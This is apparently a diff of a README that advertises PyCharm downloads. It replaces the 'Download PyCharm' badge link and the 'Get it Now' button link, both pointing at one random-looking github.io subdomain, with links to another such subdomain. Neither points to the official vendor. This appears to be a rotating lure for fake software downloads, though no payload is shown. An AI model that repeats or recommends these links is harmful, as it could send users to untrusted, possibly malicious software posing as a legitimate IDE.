@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://poxmell.github.io/.github/pyCharm">
+  <a href="https://jjfhjfk3858.github.io/.github/pyCharm">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download PyCharm"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The Community Edition's free availability is strategically important — JetBrai
 
 <p align="center">
 
-[![Get it Now PyCharm](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/pyCharm)
+[![Get it Now PyCharm](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/pyCharm)
 
 </p>
 
